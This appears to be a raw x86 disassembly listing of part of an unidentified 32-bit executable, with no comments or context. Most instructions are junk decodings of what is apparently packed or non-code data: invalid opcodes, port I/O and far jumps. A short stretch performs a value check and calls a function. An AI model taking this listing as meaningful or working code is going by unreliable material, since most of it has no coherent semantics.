  40fa4f:	pop    ecx
  40fa50:	(bad)  
  40fa51:	xor    BYTE PTR [ecx+0x3a9a84f6],bl
  40fa57:	out    dx,al
  40fa58:	int3   
  40fa59:	and    DWORD PTR es:[eax+eax*4],eax
  40fa5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa5e:	jae    0x40faa4
  40fa60:	add    DWORD PTR [esi-0x14],esp
  40fa63:	frstor [edx-0x282f2326]
  40fa69:	repz imul BYTE PTR [esi-0xf981b94]
  40fa70:	mov    BYTE PTR [eax+0x54],ah
  40fa73:	out    dx,eax
  40fa74:	bound  edi,QWORD PTR [edi+0x3bd74ba2]
  40fa7a:	(bad)  
  40fa7b:	loopne 0x40f9fd
  40fa7d:	push   esp
  40fa7e:	xor    al,0xed
  40fa80:	loopne 0x40fa85
  40fa82:	jg     0x40fad0
  40fa84:	stc    
  40fa85:	call   0xb22e:0x2226c50f
  40fa8c:	and    al,BYTE PTR [ebx+0x1f]
  40fa8f:	and    al,0x89
  40fa91:	test   al,0xcf
  40fa93:	fdiv   QWORD PTR [ebp+ebp*1+0xadd16f5]
  40fa9a:	hlt    
  40fa9b:	or     al,0x9c
  40fa9d:	jo     0x40fa22
  40fa9f:	ds loopne 0x40fa23
  40faa2:	xor    DWORD PTR [ebp+0x3c],esp
  40faa5:	pusha  
  40faa6:	mov    dh,BYTE PTR [edi]
  40faa8:	test   BYTE PTR [esi+edx*8-0x17],0x29
  40faad:	or     eax,0x42bb4744
  40fab2:	jmp    0x40faa0
  40fab4:	xchg   ecx,eax
  40fab5:	in     eax,0x7b
  40fab7:	in     eax,0xae
  40fab9:	jle    0x40fa88
  40fabb:	add    DWORD PTR [ebx],esi
  40fabd:	data16 cli 
  40fabf:	sar    BYTE PTR [ecx+0x66],cl
  40fac2:	sub    DWORD PTR [ebx-0x176c68c0],0x6e
  40fac9:	mov    edi,0x4c26b6ce
  40face:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40facf:	clc    
  40fad0:	cmp    DWORD PTR [esp+esi*4-0x7],ebp
  40fad4:	jge    0x40fb0c
  40fad6:	pop    ds
  40fad7:	pop    esi
  40fad8:	dec    BYTE PTR [ebx+0x357cdd05]
  40fade:	xor    ch,al
  40fae0:	retf   0x2ea9
  40fae3:	les    edi,FWORD PTR [eax+0x78]
  40fae6:	outs   dx,DWORD PTR ds:[esi]
  40fae7:	jmp    0x40fb0e
  40fae9:	and    BYTE PTR [edi],0x23
  40faec:	xchg   esp,eax
  40faed:	push   edi
  40faee:	das    
  40faef:	lea    ebp,[esi+esi*4-0x30]
  40faf3:	popa   
  40faf4:	sub    BYTE PTR [ebx-0xc19fbc9],dl
  40fafa:	imul   ebx,DWORD PTR ds:0xc274fbd6,0x26
  40fb01:	dec    eax
  40fb02:	adc    BYTE PTR [ebx+0x3b42f6f7],al
  40fb08:	jp     0x40fb73
  40fb0a:	mov    esp,0x56f869ce
  40fb0f:	mov    esi,0x6a1127c2
  40fb14:	call   0x692f717
  40fb19:	ret    0x9bfc
  40fb1c:	loopne 0x40fb55
  40fb1e:	mov    eax,ds:0xfb735321
  40fb23:	mov    ecx,0x9a7abba6
  40fb28:	mov    ecx,DWORD PTR [ecx+0x14ecdd84]
  40fb2e:	shl    ebp,0xd9
  40fb31:	jp     0x40fb8a
  40fb33:	mov    ds:0x532e5d94,eax
  40fb38:	jns    0x40fb96
  40fb3a:	pop    ecx
  40fb3b:	mov    dh,0x14
  40fb3d:	or     al,0x15
  40fb3f:	xchg   ebx,eax
  40fb40:	adc    eax,0xcc50930b
  40fb45:	fnstenv [ebx+0x5a]
  40fb48:	iret   
  40fb49:	pop    ebx
  40fb4a:	or     al,0x6
  40fb4c:	addr16 mov ch,0x19
  40fb4f:	out    0x35,al
  40fb51:	push   esi
  40fb52:	or     DWORD PTR [eax],esi
  40fb54:	stos   BYTE PTR es:[edi],al
  40fb55:	and    cl,BYTE PTR [ebx]
  40fb57:	iret   
  40fb58:	in     eax,dx
  40fb59:	loope  0x40fb11
  40fb5b:	pushf  
  40fb5c:	repnz mov ch,0xf0
  40fb5f:	inc    edx
  40fb60:	pusha  
  40fb61:	and    al,0x4a
  40fb63:	dec    ebp
  40fb64:	pop    eax
  40fb65:	mov    al,0xf3
  40fb67:	mov    edi,0x67cda503
  40fb6c:	push   esi
  40fb6d:	mov    ds:0x189303e4,eax
  40fb72:	out    dx,al
  40fb73:	ret    
  40fb74:	pop    eax
  40fb75:	inc    ebx
  40fb76:	test   BYTE PTR [ebx+0x39],cl
  40fb79:	pop    esp
  40fb7a:	push   ebx
  40fb7b:	mov    al,ds:0x315b3b06
  40fb80:	retf   0x14e4
  40fb83:	sbb    ebx,DWORD PTR [edx]
  40fb85:	lods   al,BYTE PTR ds:[esi]
  40fb86:	cwde   
  40fb87:	mov    bh,0xbd
  40fb89:	mov    ebx,DWORD PTR [ecx-0x19fe3964]
  40fb8f:	mov    esi,0xa6c7a8e0
  40fb94:	pop    ebp
  40fb95:	test   DWORD PTR [edi-0x27],ebx
  40fb98:	icebp  
  40fb99:	dec    ebx
  40fb9a:	inc    edi
  40fb9b:	push   ecx
  40fb9c:	inc    ebp
  40fb9d:	(bad)  
  40fb9e:	div    bh
  40fba0:	sbb    edx,edx
  40fba2:	std    
  40fba3:	ror    DWORD PTR [edi-0x70],0x38
  40fba7:	sub    eax,0xab7662f0
  40fbac:	add    ebx,DWORD PTR [eax+0x71]
  40fbaf:	cmp    dl,BYTE PTR [edi+0x10b69869]
  40fbb5:	inc    edi
  40fbb6:	scas   al,BYTE PTR es:[edi]
  40fbb7:	into   
  40fbb8:	and    al,0x23
  40fbba:	dec    edx
  40fbbb:	mov    BYTE PTR [bx+si+0x3c],ah
  40fbbf:	adc    BYTE PTR [eax-0x46],bl
  40fbc2:	das    
  40fbc3:	int    0xe9
  40fbc5:	lods   al,BYTE PTR ds:[esi]
  40fbc6:	test   DWORD PTR [ebx+0x697da762],ebx
  40fbcc:	xchg   ecx,eax
  40fbcd:	adc    al,0x86
  40fbcf:	dec    ecx
  40fbd0:	cdq    
  40fbd1:	push   ebp
  40fbd2:	daa    
  40fbd3:	call   0x35bf9551
  40fbd8:	mov    ebp,0xb2f0456c
  40fbdd:	mov    dh,BYTE PTR [ecx-0x257abaf3]
  40fbe3:	in     al,dx
  40fbe4:	push   esp
  40fbe5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbe6:	inc    ecx
  40fbe7:	sbb    ecx,DWORD PTR [ecx+0x70]
  40fbea:	int    0x49
  40fbec:	push   esi
  40fbed:	aas    
  40fbee:	mov    edi,?
  40fbf0:	imul   ebp,DWORD PTR [edi-0x5d],0x70edff9f
  40fbf7:	sub    edx,DWORD PTR [ebp+0x73]
  40fbfa:	jno    0x40fc25
  40fbfc:	shr    DWORD PTR [ecx-0x306ff8f8],1
  40fc02:	out    0x76,al
  40fc04:	cmp    eax,0xbb4e1576
  40fc09:	ror    BYTE PTR [ebx],cl
  40fc0b:	int    0x8c
  40fc0d:	mov    ebx,0x365d9fba
  40fc12:	inc    esp
  40fc13:	push   edx
  40fc14:	mov    eax,ds:0x22988518
  40fc19:	push   ss
  40fc1a:	sar    BYTE PTR [ecx+0x59],1
  40fc1d:	add    al,0x75
  40fc1f:	test   eax,0x827268f9
  40fc24:	sahf   
  40fc25:	jo     0x40fbae
  40fc27:	pop    eax
  40fc28:	cli    
  40fc29:	mov    edx,0x56f0fd8b
  40fc2e:	int3   
  40fc2f:	add    al,0xf0
  40fc31:	cdq    
  40fc32:	js     0x40fc29
  40fc34:	pop    ebx
  40fc35:	pop    edi
  40fc36:	mov    edx,esp
  40fc38:	rcr    DWORD PTR [ebx-0x25760fe6],cl
  40fc3e:	outs   dx,BYTE PTR ds:[esi]
  40fc3f:	std    
  40fc40:	and    eax,0x6f33cf25
  40fc45:	and    BYTE PTR [esi+0x7e],dl
  40fc48:	cs xchg edi,eax
  40fc4a:	(bad)  
  40fc4b:	movzx  ecx,WORD PTR [ebp+0x15]
  40fc4f:	shl    DWORD PTR ds:0xfcc658f,cl
  40fc55:	std    
  40fc56:	stc    
  40fc57:	jb     0x40fc05
  40fc59:	or     eax,0x891491a5
  40fc5e:	pop    ss
  40fc5f:	sub    eax,0x3308a3a3
  40fc64:	sbb    DWORD PTR [edi+0x3e],esi
  40fc67:	mov    bl,0x40
  40fc69:	add    dl,dh
  40fc6b:	sub    al,0xc1
  40fc6d:	or     eax,0x39b1e078
  40fc72:	shr    ebp,1
  40fc74:	jp     0x40fc40
  40fc76:	sbb    BYTE PTR [esi],ah
  40fc78:	cmp    eax,DWORD PTR [ebx+0x2f5751af]
  40fc7e:	fidiv  WORD PTR [ecx-0x80]
  40fc81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc82:	add    al,ch
  40fc84:	adc    ch,0xf8
  40fc87:	pop    ds
  40fc88:	repnz popf 
  40fc8a:	pusha  
  40fc8b:	dec    ebx
  40fc8c:	imul   esi,DWORD PTR [ebx+0x67],0xffffffd5
  40fc90:	in     eax,dx
  40fc91:	dec    ecx
  40fc92:	pop    eax
  40fc93:	loopne 0x40fce1
  40fc95:	inc    edx
  40fc96:	inc    ebx
  40fc97:	(bad)  
  40fc99:	sbb    ch,BYTE PTR [ebp+0x45]
  40fc9c:	mov    ebx,0xfd72c97b
  40fca1:	repnz sbb esi,edi
  40fca4:	les    edi,FWORD PTR [ebx-0x3e]
  40fca7:	jae    0x40fcf2
  40fca9:	les    esi,FWORD PTR [ecx]
  40fcab:	inc    ebp
  40fcac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fcad:	jge    0x40fc6b
  40fcaf:	nop
  40fcb0:	js     0x40fd00
  40fcb2:	sub    al,0xea
  40fcb4:	scas   al,BYTE PTR es:[edi]
  40fcb5:	ficom  WORD PTR ds:0xc4697806
  40fcbb:	jno    0x40fc82
  40fcbd:	imul   ebx,DWORD PTR gs:[ecx-0x31520a7c],0xffffff89
  40fcc5:	and    al,0xcd
  40fcc7:	iret   
  40fcc8:	je     0x40fd04
  40fcca:	push   cs
  40fccb:	int    0xfa
  40fccd:	sbb    BYTE PTR [edx+edi*2],cl
  40fcd0:	mov    ebx,0x48999b12
  40fcd5:	sub    BYTE PTR ds:0x9cd0052f,0x9d
  40fcdc:	jbe    0x40fd1c
  40fcde:	fisttp QWORD PTR [eax+0x3825a814]
  40fce4:	shl    DWORD PTR [eax-0x51],0xd1
  40fce8:	les    edx,FWORD PTR [edx-0x3f]
  40fceb:	pop    ebx
  40fcec:	push   ebp
  40fced:	mov    BYTE PTR [ebx],0x76
  40fcf0:	push   0x94a85c5f
  40fcf5:	jne    0x40fc91
  40fcf7:	scas   al,BYTE PTR es:[edi]
  40fcf8:	(bad)  
  40fcf9:	mov    ebx,0xd8d36b57
  40fcfe:	push   ebx
  40fcff:	xchg   ebx,eax
  40fd00:	out    0x87,al
  40fd02:	xchg   edx,eax
  40fd03:	mov    ecx,0xe16f3192
  40fd08:	arpl   WORD PTR [edx],dx
  40fd0a:	retf   
  40fd0b:	mov    bh,0x2d
  40fd0d:	dec    ecx
  40fd0e:	adc    DWORD PTR [esi],edi
  40fd10:	jmp    0xe257:0x290b89eb
  40fd17:	push   ebx
  40fd18:	pop    esp
  40fd19:	add    DWORD PTR [eax],esi
  40fd1b:	(bad)  
  40fd1c:	ds push esi
  40fd1e:	and    eax,0x27a6524e
  40fd23:	jp     0x40fd4d
  40fd25:	imul   esp,ebp,0xffffff9d
  40fd28:	pop    es
  40fd29:	or     BYTE PTR [ebp-0x13],bl
  40fd2c:	in     al,dx
  40fd2d:	out    dx,al
  40fd2e:	mov    edx,0x7ea26f9d
  40fd33:	call   0x5d83:0x3b7a5649
  40fd3a:	imul   ebp,eax,0xc4a
  40fd40:	mov    ecx,DWORD PTR ds:0x414afe
  40fd46:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40fd4c:	mov    DWORD PTR [ecx],eax
  40fd4e:	mov    eax,DWORD PTR [ebp-0x8]
  40fd51:	jmp    0x410121
  40fd56:	mov    eax,DWORD PTR [ebp-0x4]
  40fd59:	mov    ecx,DWORD PTR [ebp+0x10]
  40fd5c:	xor    eax,edi
  40fd5e:	add    eax,esi
  40fd60:	cmp    eax,ecx
  40fd62:	jne    0x41011e
  40fd68:	mov    eax,DWORD PTR [ebp-0x4]
  40fd6b:	xor    eax,edi
  40fd6d:	add    eax,esi
  40fd6f:	mov    ds:0x414b82,eax
  40fd74:	mov    eax,DWORD PTR [ebp-0x4]
  40fd77:	xor    eax,edi
  40fd79:	add    eax,esi
  40fd7b:	mov    ds:0x414b7a,eax
  40fd80:	push   DWORD PTR [ebp-0x8]
  40fd83:	push   DWORD PTR [ebp-0x4]
  40fd86:	call   0x408384
  40fd8b:	jmp    0x41011e
  40fd90:	in     eax,0x27
  40fd92:	ss xor bh,ah
  40fd95:	xor    esp,ebp
  40fd97:	icebp  
  40fd98:	add    DWORD PTR [eax+esi*4+0x77],edi
  40fd9c:	add    bl,BYTE PTR [ecx-0x68]
  40fd9f:	call   0x79f4:0x7e7eb882
  40fda6:	jle    0x40fe26
  40fda8:	dec    ebp
  40fda9:	sbb    bl,BYTE PTR [ecx+eax*8-0x49809d10]
  40fdb0:	repnz imul BYTE PTR [edx]
  40fdb3:	xor    BYTE PTR [ecx+0x4e4dcde4],bl
  40fdb9:	inc    eax
  40fdba:	pushf  
  40fdbb:	sbb    al,0x8d
  40fdbd:	jmp    0x650d:0x34e8f95a
  40fdc4:	push   edx
  40fdc5:	shr    ebx,cl
  40fdc7:	(bad)  
  40fdc8:	mov    al,ds:0x87eeaaac
  40fdcd:	paddw  mm6,QWORD PTR [ebp+0x2f]
  40fdd1:	outs   dx,BYTE PTR ds:[esi]
  40fdd2:	jns    0x40fddb
  40fdd4:	cmp    ebp,DWORD PTR [edi-0x23]
  40fdd7:	dec    ebp
  40fdd8:	xor    al,al
  40fdda:	lods   al,BYTE PTR ds:[esi]
  40fddb:	test   eax,0x2d5b3b28
  40fde0:	sub    BYTE PTR [eax-0x7f56a362],cl
  40fde6:	adc    ah,BYTE PTR [ebx+0x19]
  40fde9:	add    eax,0x6d9c6da
  40fdee:	xchg   edi,eax
  40fdef:	stos   DWORD PTR es:[edi],eax
  40fdf0:	xchg   BYTE PTR [eax+ecx*8],bl
  40fdf3:	inc    BYTE PTR [ecx-0x4de93f64]
  40fdf9:	pop    ds
  40fdfa:	push   ebx
  40fdfb:	icebp  
  40fdfc:	dec    ecx
  40fdfd:	int3   
  40fdfe:	sbb    dl,bl
  40fe00:	call   0x3f84df17
  40fe05:	ret    0x6883
  40fe08:	mov    bh,ah
  40fe0a:	leave  
  40fe0b:	cs mov dl,0x4e
  40fe0e:	shl    DWORD PTR [edx+0x6382835f],cl
  40fe14:	lods   al,BYTE PTR ds:[esi]
  40fe15:	sub    cl,cl
  40fe17:	jmp    0x221c:0x489bcddd
  40fe1e:	xchg   edx,eax
  40fe1f:	push   edx
  40fe20:	adc    eax,0x1af6f8c
  40fe25:	mov    esi,0x54aee409
  40fe2a:	ins    BYTE PTR es:[edi],dx
  40fe2b:	call   0xb76ff3a2
  40fe30:	(bad)  
  40fe31:	rol    esp,cl
  40fe33:	mov    eax,0x3e44d59c
  40fe38:	push   edi
  40fe39:	xor    edx,DWORD PTR [ebx-0x5]
  40fe3c:	mov    dl,0x87
  40fe3e:	pop    esp
  40fe3f:	push   edx
  40fe40:	mov    ecx,0x1b6e7d2e
  40fe45:	and    ch,ah
  40fe47:	cdq    
  40fe48:	mov    ecx,0xb35e7817
  40fe4d:	jge    0x40fe4c
  40fe4f:	in     al,dx
  40fe50:	xor    BYTE PTR [ecx+0x30],al
  40fe53:	or     ebp,DWORD PTR [ecx+0x3f]
  40fe56:	icebp  
  40fe57:	xlat   BYTE PTR ds:[ebx]
  40fe58:	in     al,0x20
  40fe5a:	fcom   st(3)
  40fe5c:	popa   
  40fe5d:	inc    eax
  40fe5e:	sub    ah,BYTE PTR [ebp-0xb]
  40fe61:	pusha  
  40fe62:	(bad)  
  40fe63:	icebp  
  40fe64:	mov    ecx,0x2072ed1b
  40fe69:	fcomp  QWORD PTR [edx]
  40fe6b:	(bad)  
  40fe6c:	mov    al,ds:0x3bdbc47e
  40fe71:	mov    BYTE PTR [eax],dl
  40fe73:	ins    DWORD PTR es:[edi],dx
  40fe74:	mov    ebp,0x840b1063
  40fe79:	ins    DWORD PTR es:[edi],dx
  40fe7a:	je     0x40fe6e
  40fe7c:	inc    esp
  40fe7d:	push   ds
  40fe7e:	clc    
  40fe7f:	mov    DWORD PTR [esi-0x5b4332f5],ecx
  40fe85:	in     al,dx
  40fe86:	cmp    al,BYTE PTR [edi]
  40fe88:	and    edi,DWORD PTR [ecx]
  40fe8a:	pushf  
  40fe8b:	fldcw  WORD PTR ds:[edx+0x1f]
  40fe8f:	jle    0x40ff08
  40fe91:	sbb    ebx,DWORD PTR [esi]
  40fe93:	popa   
  40fe94:	ja     0x40ff12
  40fe96:	aas    
  40fe97:	sub    DWORD PTR [esi+0x1bd8f816],0xffffffdc
  40fe9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe9f:	sub    esi,DWORD PTR [ecx-0x50e1b2a6]
  40fea5:	nop
  40fea6:	cmp    DWORD PTR [eax-0x7a],esp
  40fea9:	mov    ebx,DWORD PTR [ecx-0x4e]
  40feac:	lea    esi,[eax-0x21]
  40feaf:	xor    eax,0xb74b012c
  40feb4:	loop   0x40fedc
  40feb6:	rol    dh,1
  40feb8:	dec    esi
  40feb9:	jmp    0xe4fac034
  40febe:	arpl   dx,sp
  40fec0:	xlat   BYTE PTR ds:[ebx]
  40fec1:	in     eax,dx
  40fec2:	ja     0x40fec8
  40fec4:	cli    
  40fec5:	cmp    al,0x3d
  40fec7:	hlt    
  40fec8:	inc    ecx
  40fec9:	pop    eax
  40feca:	imul   esp,DWORD PTR [ecx-0x70ac217f],0x2c47f53f
  40fed4:	out    dx,eax
  40fed5:	adc    DWORD PTR [eax+0x4a145697],ebp
  40fedb:	stos   BYTE PTR es:[edi],al
  40fedc:	mov    bh,0x5b
  40fede:	jg     0x40ff47
  40fee0:	aas    
  40fee1:	clc    
  40fee2:	sbb    dl,cl
  40fee4:	adc    DWORD PTR [edx],ecx
  40fee6:	enter  0x661a,0x3f
  40feea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40feeb:	or     DWORD PTR [edi+0x6],esi
  40feee:	js     0x40ff2b
  40fef0:	iret   
  40fef1:	sub    DWORD PTR [ecx-0xb58b0b5],eax
  40fef7:	mov    edx,0xe262517e
  40fefc:	inc    ecx
  40fefd:	(bad)  
  40fefe:	enter  0x3d59,0xcf
  40ff02:	and    eax,ebp
  40ff04:	adc    eax,0xcba1b29f
  40ff09:	cli    
  40ff0a:	daa    
  40ff0b:	pop    edi
  40ff0c:	or     DWORD PTR [esi],ebx
  40ff0e:	sti    
  40ff0f:	cmp    edi,DWORD PTR [ecx+0x2f4fbfb8]
  40ff15:	jp     0x40ff79
  40ff17:	mov    cl,0x89
  40ff19:	mov    ss:0x1837480d,eax
  40ff1f:	dec    ebp
  40ff20:	sti    
  40ff21:	xchg   ebx,eax
  40ff22:	(bad)  
  40ff23:	pop    ss
  40ff24:	cmp    dl,BYTE PTR [edi]
  40ff26:	mov    ah,0x4
  40ff28:	mov    ch,0xd
  40ff2a:	cmp    BYTE PTR [edx+0x717759b6],0xb1
  40ff31:	mov    ds:0x598295dc,al
  40ff36:	inc    esi
  40ff37:	pop    edi
  40ff38:	nop
  40ff39:	jmp    0x40ffb4
  40ff3b:	call   0x1328:0xc83e0982
  40ff42:	mov    al,0xf0
  40ff44:	pop    ds
  40ff45:	mov    eax,0x4f3017c7
  40ff4a:	sti    
  40ff4b:	xor    BYTE PTR [ebp-0x5f],0x3e
  40ff4f:	adc    BYTE PTR [ebx+0x54],bh
  40ff52:	jge    0x40ff99
  40ff54:	or     DWORD PTR [bx+0x42e6],esi
  40ff59:	jecxz  0x40ffb4
  40ff5b:	(bad)  
  40ff5c:	cmp    al,0xbe
  40ff5e:	into   
  40ff5f:	ins    BYTE PTR es:[edi],dx
  40ff60:	mov    al,0x21
  40ff62:	pop    esp
  40ff63:	inc    esi
  40ff64:	pushf  
  40ff65:	(bad)  
  40ff66:	(bad)  
  40ff67:	pop    esp
  40ff68:	and    ch,bl
  40ff6a:	mov    WORD PTR [edx-0x6d],ss
  40ff6d:	sbb    eax,DWORD PTR [ebx-0x2b63c0ba]
  40ff73:	push   ds
  40ff74:	in     al,0xa3
  40ff76:	cmp    eax,0x528ab50a
  40ff7b:	dec    ebp
  40ff7c:	jae    0x40ffa8
  40ff7e:	and    BYTE PTR [esi],0xef
  40ff81:	aaa    
  40ff82:	and    BYTE PTR [ebp+0x5c832bab],bl
  40ff88:	loop   0x40ff79
  40ff8a:	call   FWORD PTR [ebx+0x857853]
  40ff90:	inc    esp
  40ff91:	xor    cl,BYTE PTR [eax-0x3e]
  40ff94:	clc    
  40ff95:	add    DWORD PTR [edi-0x4e],0x95109d87
  40ff9c:	xor    DWORD PTR [edx-0x25],0x647966fe
  40ffa3:	mov    ds:0x5fdd5154,al
  40ffa8:	jg     0x40ffca
  40ffaa:	cmp    ah,BYTE PTR [edi]
  40ffac:	and    ecx,ebx
  40ffae:	pop    eax
  40ffaf:	shl    BYTE PTR [edi],0xa
  40ffb2:	iret   
  40ffb3:	and    BYTE PTR [eax+0x1a0eb1fe],bl
  40ffb9:	ins    BYTE PTR es:[edi],dx
  40ffba:	xchg   esi,ebp
  40ffbc:	retf   0x629f
  40ffbf:	push   0xe786c72b
  40ffc4:	cs test al,0xa3
  40ffc7:	jmp    0x1437a76f
  40ffcc:	cld    
  40ffcd:	cmp    ebx,edx
  40ffcf:	div    edx
  40ffd1:	cmp    BYTE PTR [ecx],bh
  40ffd3:	stos   BYTE PTR es:[edi],al
  40ffd4:	fisubr WORD PTR [edx+0x38]
  40ffd7:	cli    
  40ffd8:	xchg   esp,eax
  40ffd9:	sub    dl,cl
  40ffdb:	push   ebp
  40ffdc:	mov    ch,0xf4
  40ffde:	xchg   ecx,eax
  40ffdf:	cmp    edx,esi
  40ffe1:	mov    bl,0xc7
  40ffe3:	xchg   DWORD PTR [esi+eiz*8],ebp
  40ffe6:	mov    ch,cl
  40ffe8:	loop   0x40ffb5
  40ffea:	add    esp,DWORD PTR ds:0xc79b826
  40fff0:	sub    DWORD PTR [eax],ecx
  40fff2:	call   0xd98e:0xf51e1e71
  40fff9:	xchg   esi,eax
  40fffb:	push   cs
  40fffc:	sti    
  40fffd:	sbb    eax,ecx
  40ffff:	push   ds
  410000:	jp     0x410062
  410002:	or     ebx,ebp
  410004:	repnz stos BYTE PTR es:[edi],al
  410006:	adc    ah,0xd
  410009:	mov    ch,0x1e
  41000b:	and    DWORD PTR [edi+0x34],edi
  41000e:	cwde   
  41000f:	mov    cl,0xc
  410011:	mov    bh,0xff
  410013:	mov    eax,ds:0x387e44c0
  410018:	leave  
  410019:	mov    bl,BYTE PTR [ecx]
  41001b:	or     eax,0x139b4499
  410020:	pusha  
  410021:	dec    ebp
  410022:	stc    
  410023:	xor    ecx,DWORD PTR [esi]
  410025:	adc    esp,DWORD PTR [eax+0x3f]
  410028:	or     BYTE PTR [ecx+0x149366c4],dh
  41002e:	sbb    eax,0x22792d3a
  410033:	imul   ebx
  410035:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410036:	popa   
  410037:	push   esp
  410038:	xor    eax,0x898fbcc4
  41003d:	cwde   
  41003e:	jge    0x410038
  410040:	scas   eax,DWORD PTR es:[edi]
  410041:	mov    eax,ds:0x996fd87e
  410046:	lahf   
  410047:	rcl    ch,0xef
  41004a:	stos   BYTE PTR es:[edi],al
  41004b:	gs (bad) 
  41004d:	push   ecx
  41004e:	and    edi,ebp
  410050:	(bad)  [edi+0x1f]
  410053:	fwait
  410054:	and    al,BYTE PTR [eax-0xa8a2624]
  41005a:	mov    esp,0xd2791f3e
  41005f:	jb     0x4100b4
  410061:	jae    0x41001a
  410063:	rol    BYTE PTR [esi+0x7f6c2b74],1
  410069:	push   esi
  41006a:	(bad)  
  41006c:	call   0x57a0:0xe26489e3
  410073:	dec    esp
  410074:	in     al,0x7b
  410076:	stos   BYTE PTR es:[edi],al
  410077:	arpl   WORD PTR [ebx+0x5e],cx
  41007a:	shl    BYTE PTR [ecx+0x3adf6798],cl
  410080:	dec    esp
  410081:	or     BYTE PTR [ebx+esi*1-0x33],dl
  410085:	dec    ecx
  410086:	push   ebx
  410087:	das    
  410088:	out    dx,eax
  410089:	or     ah,bh
  41008b:	push   ebx
  41008c:	out    dx,al
  41008d:	ret    
  41008e:	mov    ds:0xaf7f248c,al
  410093:	int3   
  410094:	repz cmp DWORD PTR [edi],0xffffffe8
  410098:	or     BYTE PTR [ecx],dl
  41009a:	popa   
  41009b:	lea    ecx,[eax+0x5e]
  41009e:	test   al,0xc3
  4100a0:	mov    esp,0x1d356a99
  4100a5:	sbb    DWORD PTR [edi],eax
  4100a7:	xor    BYTE PTR [edi+0x349a5ed3],ah
  4100ad:	ins    DWORD PTR es:[edi],dx
  4100ae:	call   0x4b3543df
  4100b3:	mov    ebp,0x968b2c68
  4100b8:	aad    0x55
  4100ba:	stos   DWORD PTR es:[edi],eax
  4100bb:	enter  0xb55c,0xa4
  4100bf:	mov    dh,0xc8
  4100c1:	mov    WORD PTR [ecx+0x4a],?
  4100c4:	(bad)  
  4100c5:	sar    DWORD PTR [ecx+0x24],cl
  4100c8:	sub    BYTE PTR [ecx],0x52
  4100cb:	ja     0x41010b
  4100cd:	das    
  4100ce:	jb     0x4100c9
  4100d0:	mov    bh,0xf2
  4100d2:	jmp    0x87:0x831e4ff0
  4100d9:	push   cs
  4100da:	mov    DWORD PTR [ebp-0x507bc05a],esi
  4100e0:	add    dh,BYTE PTR [esi-0x3e]
  4100e3:	inc    ebx
  4100e4:	out    0x16,al
  4100e6:	mov    BYTE PTR [esp-0x7d],0x89
  4100eb:	repz mov eax,ds:0xb11ab317
  4100f1:	out    0x32,al
  4100f3:	(bad)  
  4100f4:	or     eax,0x7d2d32e
  4100f9:	mov    ch,BYTE PTR [ebx]
  4100fb:	push   ds
  4100fc:	add    ebx,DWORD PTR [edx]
  4100fe:	sub    eax,0x7bc090bf
  410103:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410104:	sub    DWORD PTR [ecx+0x66],esi
  410107:	cwde   
  410108:	push   cs
  410109:	shl    DWORD PTR [esi],cl
  41010b:	ins    BYTE PTR es:[edi],dx
  41010c:	das    
  41010d:	scas   eax,DWORD PTR es:[edi]
  41010e:	nop
  41010f:	call   0x8521:0x9c4f465
  410116:	in     al,0x7
  410118:	jns    0x410106
  41011a:	imul   ebx,DWORD PTR [ebp+0x458b3bc9],0x5fc733fc
  410124:	jmp    0x4104b7
  410129:	push   ecx
  41012a:	clc    
  41012b:	clc    
  41012c:	mov    ebx,0x9c5dbb51
  410131:	test   BYTE PTR [edi-0x56],dh
  410134:	adc    esi,ecx
  410136:	aas    
  410137:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410139:	js     0x41017f
  41013b:	jle    0x4101bb
  41013d:	hlt    
  41013e:	jns    0x4101be
  410140:	jle    0x410169
  410142:	iret   
  410143:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410144:	or     al,0x73
  410146:	adc    al,0x1d
  410148:	shl    DWORD PTR [ecx+0x43f86c43],cl
  41014e:	cmp    BYTE PTR [ecx-0x5a6a8db8],dl
  410154:	adc    eax,0x96ebf971
  410159:	or     cl,bh
  41015b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41015c:	aad    0xd1
  41015e:	(bad)  
  41015f:	dec    edx
  410160:	sbb    cl,BYTE PTR [ecx+0x21]
  410163:	jne    0x41011d
  410165:	sbb    BYTE PTR [ebx-0x4e],dh
  410168:	es loopne 0x4101dc
  41016b:	mul    BYTE PTR [eax]
  41016d:	mov    al,0x15
  41016f:	out    0xf0,al
  410171:	pushf  
  410172:	jl     0x4101ba
  410174:	sar    BYTE PTR [edx+0x58],cl
  410177:	gs fs jbe 0x41018c
  41017b:	or     eax,0xe8122ed8
  410180:	sub    BYTE PTR [edx],0x69
  410183:	repz cmc 
  410185:	leave  
  410186:	jnp    0x410142
  410188:	outs   dx,BYTE PTR ds:[esi]
  410189:	mov    bl,0xda
  41018b:	and    dl,BYTE PTR [ebx+0x5dfd86af]
  410191:	mov    bl,0xb1
  410193:	aas    
  410194:	(bad)  
  410195:	jg     0x41012a
  410197:	lock adc DWORD PTR [eax],0x522e49d9
  41019e:	add    eax,0x448dad70
  4101a3:	mov    eax,ds:0xe498c5cf
  4101a8:	fild   WORD PTR [ebp+0x59]
  4101ab:	sbb    esp,DWORD PTR [ebp+0x44]
  4101ae:	pushf  
  4101af:	sbb    eax,0xdd46f2cb
  4101b4:	mov    dh,0x92
  4101b6:	lods   al,BYTE PTR ds:[esi]
  4101b7:	aaa    
  4101b8:	sti    
  4101b9:	xor    eax,0xb01a292c
  4101be:	dec    edx
  4101bf:	jp     0x410229
  4101c1:	dec    ecx
  4101c2:	mov    eax,ds:0x6a472f47
  4101c7:	push   es
  4101c8:	inc    esp
  4101c9:	clc    
  4101ca:	xor    BYTE PTR [edi],ch
  4101cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101cd:	pop    edi
  4101ce:	fisttp WORD PTR [edx+ebp*2]
  4101d1:	mov    edx,0xf979584
  4101d6:	jg     0x410158
  4101d8:	scas   eax,DWORD PTR es:[edi]
